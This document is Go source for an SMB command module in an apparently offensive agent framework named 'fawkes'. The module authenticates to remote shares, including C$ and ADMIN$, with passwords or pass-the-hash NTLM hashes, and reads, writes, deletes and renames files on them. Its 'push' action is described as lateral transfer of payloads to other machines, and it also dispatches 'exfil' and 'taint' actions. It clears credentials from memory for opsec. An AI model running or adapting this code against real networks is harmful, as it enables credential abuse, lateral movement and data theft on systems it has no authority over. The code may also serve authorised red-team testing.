package commands

import (
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/hirochachacha/go-smb2"
)

type SmbCommand struct{}

func (c *SmbCommand) Name() string { return "smb" }
func (c *SmbCommand) Description() string {
	return "SMB file operations on remote shares — list, read, write, delete files via SMB2 (T1021.002)"
}

type smbArgs struct {
	Action      string `json:"action"`      // ls, cat, upload, rm, shares, mkdir, mv, push, taint
	Host        string `json:"host"`        // target host
	Share       string `json:"share"`       // share name (e.g., C$, ADMIN$, ShareName)
	Path        string `json:"path"`        // file/directory path within share
	Username    string `json:"username"`    // DOMAIN\user or user
	Password    string `json:"password"`    // password
	Hash        string `json:"hash"`        // NTLM hash (pass-the-hash, hex-encoded NT hash)
	Domain      string `json:"domain"`      // domain (optional, can be part of username)
	Content     string `json:"content"`     // file content for upload action
	Destination string `json:"destination"` // destination path for mv action
	Source      string `json:"source"`      // local file path for push action
	PlantName   string `json:"plant_name"`  // filename to plant on shares (for taint action)
	Port        int    `json:"port"`        // SMB port (default: 445)
}

func (c *SmbCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Use -action <shares|ls|cat|upload|rm|mkdir|mv> -host <target> -username <user> -password <pass>")
	}

	args, parseErr := unmarshalParams[smbArgs](task)
	if parseErr != nil {
		return *parseErr
	}
	defer zeroCredentials(&args.Password, &args.Hash)

	if args.Host == "" || args.Username == "" || (args.Password == "" && args.Hash == "") {
		return errorResult("Error: host, username, and password (or hash) are required")
	}

	if args.Action == "" {
		return errorResult("Error: action required. Valid actions: shares, ls, cat, upload, rm, mkdir, mv, push")
	}

	if args.Port <= 0 {
		args.Port = 445
	}

	// Parse domain from username if DOMAIN\user format
	if args.Domain == "" {
		args.Domain, args.Username = parseDomainUser(args.Username)
	}

	switch args.Action {
	case "shares":
		return smbListShares(args)
	case "ls":
		if args.Share == "" {
			return errorResult("Error: -share required for ls action")
		}
		return smbListDir(args)
	case "cat":
		if args.Share == "" || args.Path == "" {
			return errorResult("Error: -share and -path required for cat action")
		}
		return smbReadFile(args)
	case "upload":
		if args.Share == "" || args.Path == "" || args.Content == "" {
			return errorResult("Error: -share, -path, and -content required for upload action")
		}
		return smbWriteFile(args)
	case "rm":
		if args.Share == "" || args.Path == "" {
			return errorResult("Error: -share and -path required for rm action")
		}
		return smbDeleteFile(args)
	case "mkdir":
		if args.Share == "" || args.Path == "" {
			return errorResult("Error: -share and -path required for mkdir action")
		}
		return smbMkdir(args)
	case "mv":
		if args.Share == "" || args.Path == "" || args.Destination == "" {
			return errorResult("Error: -share, -path (source), and -destination (target) required for mv action")
		}
		return smbRename(args)
	case "push":
		if args.Share == "" || args.Path == "" || args.Source == "" {
			return errorResult("Error: -share, -path (remote destination), and -source (local file) required for push action")
		}
		return smbPushFile(args)
	case "exfil":
		if args.Share == "" || args.Source == "" {
			return errorResult("Error: -share and -source (local file) required for exfil action. -path is optional (default: random name)")
		}
		return smbExfilFile(args)
	case "taint":
		if args.Source == "" && args.Content == "" {
			return errorResult("Error: -source (local file to plant) or -content (inline content) required for taint action")
		}
		return smbTaintShares(args)
	default:
		return errorf("Error: unknown action %q. Valid: shares, ls, cat, upload, rm, mkdir, mv, push, exfil, taint", args.Action)
	}
}

// smbConn wraps an SMB session with its underlying connection for deadline management.
type smbConn struct {
	session *smb2.Session
	conn    net.Conn
}

// setDeadline sets a timeout deadline on the underlying TCP connection.
// Call this before each SMB operation to prevent indefinite hangs.
func (sc *smbConn) setDeadline(timeout time.Duration) {
	_ = sc.conn.SetDeadline(time.Now().Add(timeout))
}

// clearDeadline removes the deadline after an operation completes.
func (sc *smbConn) clearDeadline() {
	_ = sc.conn.SetDeadline(time.Time{})
}

// close logs off the session and closes the TCP connection.
func (sc *smbConn) close() {
	_ = sc.session.Logoff()
	_ = sc.conn.Close()
}

// smbOperationTimeout is the default timeout for individual SMB operations.
const smbOperationTimeout = 30 * time.Second

func smbConnect(args smbArgs) (*smbConn, error) {
	session, conn, err := smbDialSession(args.Host, args.Port, args.Username, args.Domain, args.Password, args.Hash, smbOperationTimeout)
	if err != nil {
		return nil, fmt.Errorf("SMB auth to %s as %s\\%s: %v", args.Host, args.Domain, args.Username, err)
	}
	return &smbConn{session: session, conn: conn}, nil
}

func smbListShares(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	shares, err := sc.session.ListSharenames()
	sc.clearDeadline()
	if err != nil {
		return errorf("Error listing shares: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Shares on \\\\%s (%d found)\n", args.Host, len(shares)))
	sb.WriteString(strings.Repeat("-", 40) + "\n")
	for _, share := range shares {
		sb.WriteString(fmt.Sprintf("  \\\\%s\\%s\n", args.Host, share))
	}

	return successResult(sb.String())
}

func smbListDir(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	dirPath := args.Path
	// Normalize path: strip leading backslashes/slashes (users often try UNC-style \\)
	dirPath = strings.TrimLeft(dirPath, "\\/")
	if dirPath == "" {
		dirPath = "."
	}

	sc.setDeadline(smbOperationTimeout)
	entries, err := share.ReadDir(dirPath)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error listing \\\\%s\\%s\\%s: %v", args.Host, args.Share, dirPath, err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] \\\\%s\\%s\\%s (%d entries)\n", args.Host, args.Share, dirPath, len(entries)))
	sb.WriteString(fmt.Sprintf("%-12s  %-20s  %s\n", "Size", "Modified", "Name"))
	sb.WriteString(strings.Repeat("-", 60) + "\n")

	for _, entry := range entries {
		name := entry.Name()
		if entry.IsDir() {
			name += "/"
		}
		size := formatFileSize(entry.Size())
		modified := entry.ModTime().Format("2006-01-02 15:04:05")
		sb.WriteString(fmt.Sprintf("%-12s  %-20s  %s\n", size, modified, name))
	}

	return successResult(sb.String())
}

func smbReadFile(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	sc.setDeadline(smbOperationTimeout)
	f, err := share.Open(args.Path)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error opening \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
	}
	defer func() { _ = f.Close() }()

	// Get file info for size check
	sc.setDeadline(smbOperationTimeout)
	info, err := f.Stat()
	sc.clearDeadline()
	if err != nil {
		return errorf("Error getting file info: %v", err)
	}

	// Limit to 10MB to avoid memory issues
	const maxSize = 10 * 1024 * 1024
	if info.Size() > maxSize {
		return errorf("Error: file too large (%s). Max 10MB for cat. Use download for large files.", formatFileSize(info.Size()))
	}

	sc.setDeadline(smbOperationTimeout)
	data, err := io.ReadAll(f)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error reading file: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] \\\\%s\\%s\\%s (%s)\n", args.Host, args.Share, args.Path, formatFileSize(info.Size())))
	sb.WriteString(strings.Repeat("-", 60) + "\n")
	sb.WriteString(string(data))
	structs.ZeroBytes(data) // opsec: clear SMB file content from memory

	return successResult(sb.String())
}

func smbWriteFile(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	sc.setDeadline(smbOperationTimeout)
	f, err := share.OpenFile(args.Path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
	}
	defer func() { _ = f.Close() }()

	sc.setDeadline(smbOperationTimeout)
	n, err := f.Write([]byte(args.Content))
	sc.clearDeadline()
	if err != nil {
		return errorf("Error writing file: %v", err)
	}

	return successf("[+] Written %d bytes to \\\\%s\\%s\\%s", n, args.Host, args.Share, args.Path)
}

func smbDeleteFile(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	sc.setDeadline(smbOperationTimeout)
	err = share.Remove(args.Path)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error deleting \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
	}

	return successf("[+] Deleted \\\\%s\\%s\\%s", args.Host, args.Share, args.Path)
}

func smbMkdir(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	sc.setDeadline(smbOperationTimeout)
	err = share.MkdirAll(args.Path, 0755)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
	}

	return successf("[+] Created directory \\\\%s\\%s\\%s", args.Host, args.Share, args.Path)
}

func smbRename(args smbArgs) structs.CommandResult {
	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	sc.setDeadline(smbOperationTimeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	sc.setDeadline(smbOperationTimeout)
	err = share.Rename(args.Path, args.Destination)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error renaming \\\\%s\\%s\\%s → %s: %v", args.Host, args.Share, args.Path, args.Destination, err)
	}

	return successf("[+] Renamed \\\\%s\\%s\\%s → %s", args.Host, args.Share, args.Path, args.Destination)
}

// smbPushFile reads a local file and writes it to a remote SMB share.
// This enables lateral tool transfer (T1570) — pushing payloads, scripts,
// or tools from the agent's host to other machines on the network.
func smbPushFile(args smbArgs) structs.CommandResult {
	// Read local file
	data, err := os.ReadFile(args.Source)
	if err != nil {
		return errorf("Error reading local file %s: %v", args.Source, err)
	}
	defer structs.ZeroBytes(data) // clear file content from memory

	sc, err := smbConnect(args)
	if err != nil {
		return errorf("Error: %v", err)
	}
	defer sc.close()

	// Use longer timeout for large files (60s or 1MB/s estimate)
	timeout := smbOperationTimeout
	if estimated := time.Duration(len(data)/1024/1024+1) * time.Second * 2; estimated > timeout {
		timeout = estimated
	}

	sc.setDeadline(timeout)
	share, err := sc.session.Mount(args.Share)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error mounting \\\\%s\\%s: %v", args.Host, args.Share, err)
	}
	defer func() { _ = share.Umount() }()

	sc.setDeadline(timeout)
	f, err := share.OpenFile(args.Path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error creating \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
	}
	defer func() { _ = f.Close() }()

	sc.setDeadline(timeout)
	n, err := f.Write(data)
	sc.clearDeadline()
	if err != nil {
		return errorf("Error writing to \\\\%s\\%s\\%s: %v", args.Host, args.Share, args.Path, err)
	}

	return successf("[+] Pushed %s (%s) → \\\\%s\\%s\\%s",
		args.Source, formatFileSize(int64(n)), args.Host, args.Share, args.Path)
}

// formatFileSize is defined in find.go
